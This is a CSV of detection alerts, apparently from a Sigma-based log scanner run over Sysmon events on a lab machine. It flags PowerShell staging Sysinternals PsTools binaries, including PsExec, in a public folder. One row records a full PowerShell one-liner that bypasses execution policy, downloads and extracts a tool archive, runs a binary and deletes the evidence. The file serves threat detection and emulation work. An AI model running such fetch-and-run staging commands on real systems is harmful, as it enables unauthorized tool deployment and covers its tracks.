"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:26:39.097 +01:00","Windows Shell/Scripting Application File Write to Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1059","sysmon",172753,"Path: C:\Users\Public\temp\psloglist64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.096 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.096","file_event_win_shell_write_susp_directory.yml","b2835a5e-669b-c230-7db9-88de21764ec3","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.109 +01:00","Windows Shell/Scripting Application File Write to Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1059","sysmon",172754,"Path: C:\Users\Public\temp\pspasswd.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.107 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.107","file_event_win_shell_write_susp_directory.yml","b2835a5e-669b-c230-7db9-88de21764ec3","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.118 +01:00","Windows Shell/Scripting Application File Write to Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1059","sysmon",172755,"Path: C:\Users\Public\temp\pspasswd64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.116 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.116","file_event_win_shell_write_susp_directory.yml","b2835a5e-669b-c230-7db9-88de21764ec3","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.129 +01:00","Windows Shell/Scripting Application File Write to Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1059","sysmon",172756,"Path: C:\Users\Public\temp\PsService.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.127 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.127","file_event_win_shell_write_susp_directory.yml","b2835a5e-669b-c230-7db9-88de21764ec3","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.142 +01:00","Windows Shell/Scripting Application File Write to Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1059","sysmon",172757,"Path: C:\Users\Public\temp\PsService64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.137 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.137","file_event_win_shell_write_susp_directory.yml","b2835a5e-669b-c230-7db9-88de21764ec3","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.150 +01:00","Windows Shell/Scripting Application File Write to Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1059","sysmon",172758,"Path: C:\Users\Public\temp\pssuspend.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.146 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.148","file_event_win_shell_write_susp_directory.yml","b2835a5e-669b-c230-7db9-88de21764ec3","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.165 +01:00","Windows Shell/Scripting Application File Write to Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1059","sysmon",172759,"Path: C:\Users\Public\temp\pssuspend64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.158 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.160","file_event_win_shell_write_susp_directory.yml","b2835a5e-669b-c230-7db9-88de21764ec3","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.175 +01:00","Windows Shell/Scripting Application File Write to Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1059","sysmon",172760,"Path: C:\Users\Public\temp\PsExec.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.172 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.172","file_event_win_shell_write_susp_directory.yml","b2835a5e-669b-c230-7db9-88de21764ec3","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.189 +01:00","Windows Shell/Scripting Application File Write to Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1059","sysmon",172761,"Path: C:\Users\Public\temp\PsExec64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.187 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.187","file_event_win_shell_write_susp_directory.yml","b2835a5e-669b-c230-7db9-88de21764ec3","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.216 +01:00","Windows Shell/Scripting Application File Write to Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1059","sysmon",172762,"Path: C:\Users\Public\temp\Pstools.chm ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.214 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.216","file_event_win_shell_write_susp_directory.yml","b2835a5e-669b-c230-7db9-88de21764ec3","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.677 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172736,"Path: C:\Users\Public\temp\PsLoggedon.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.675 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.677","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.707 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172737,"Path: C:\Users\Public\temp\PsLoggedon64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.705 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.705","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.729 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172738,"Path: C:\Users\Public\temp\psping.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.728 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.728","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.753 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172739,"Path: C:\Users\Public\temp\psping64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.752 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.752","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.778 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172740,"Path: C:\Users\Public\temp\psshutdown.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.776 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.776","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.805 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172741,"Path: C:\Users\Public\temp\psshutdown64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.804 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.804","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.834 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172742,"Path: C:\Users\Public\temp\psfile.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.833 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.833","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.858 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172743,"Path: C:\Users\Public\temp\psfile64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.857 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.857","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.882 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172744,"Path: C:\Users\Public\temp\PsGetsid.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.881 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.881","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.908 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172745,"Path: C:\Users\Public\temp\PsGetsid64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.906 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.906","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.934 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172746,"Path: C:\Users\Public\temp\PsInfo.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.932 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.934","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.960 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172747,"Path: C:\Users\Public\temp\PsInfo64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.958 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.958","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.986 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172748,"Path: C:\Users\Public\temp\pskill.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.985 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.985","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.011 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172749,"Path: C:\Users\Public\temp\pskill64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.011 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.011","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.035 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172750,"Path: C:\Users\Public\temp\pslist.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.033 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.033","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.058 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172751,"Path: C:\Users\Public\temp\pslist64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.057 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.057","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.083 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172752,"Path: C:\Users\Public\temp\psloglist.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.080 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.080","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.097 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172753,"Path: C:\Users\Public\temp\psloglist64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.096 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.096","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.109 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172754,"Path: C:\Users\Public\temp\pspasswd.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.107 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.107","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.118 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172755,"Path: C:\Users\Public\temp\pspasswd64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.116 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.116","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.129 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172756,"Path: C:\Users\Public\temp\PsService.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.127 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.127","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.142 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172757,"Path: C:\Users\Public\temp\PsService64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.137 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.137","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.150 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172758,"Path: C:\Users\Public\temp\pssuspend.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.146 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.148","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.165 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172759,"Path: C:\Users\Public\temp\pssuspend64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.158 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.160","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.175 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172760,"Path: C:\Users\Public\temp\PsExec.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.172 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.172","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.189 +01:00","Suspicious Binaries and Scripts in Public Folder","high","DESKTOP-G2OBL3D","Sysmon",11,"Exec","T1204","sysmon",172761,"Path: C:\Users\Public\temp\PsExec64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.187 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.187","file_event_win_susp_public_folder_extension.yml","ef4c38c9-e26f-dcfe-1cbe-6323bafb8f39","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.783 +01:00","Dynamic .NET Compilation Via Csc.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1027.004","sysmon",172733,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\5wmkblvr\5wmkblvr.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""$ps_url = \""https://download.sysinternals.com/files/PSTools.zip\"";$download_folder = \""C:\Users\Public\\\"";$staging_folder = \""C:\Users\Public\temp\"";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\""PSTools.zip\"" -DestinationPath $staging_folder;iex $staging_folder\""\pslist.exe\"" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder\""PSTools.zip\"";Remove-Item $staging_folder -Recurse"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3464 ¦ PGUID: E9F06A57-9888-694A-F002-000000002300 ¦ ParentPID: 2592 ¦ ParentPGUID: E9F06A57-9888-694A-EF02-000000002300 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:26:32.755","proc_creation_win_csc_susp_dynamic_compilation.yml","29fb510e-d79c-6420-e60d-c05b708a6f9e","C:\Tools\Logs\mc_enum.evtx"
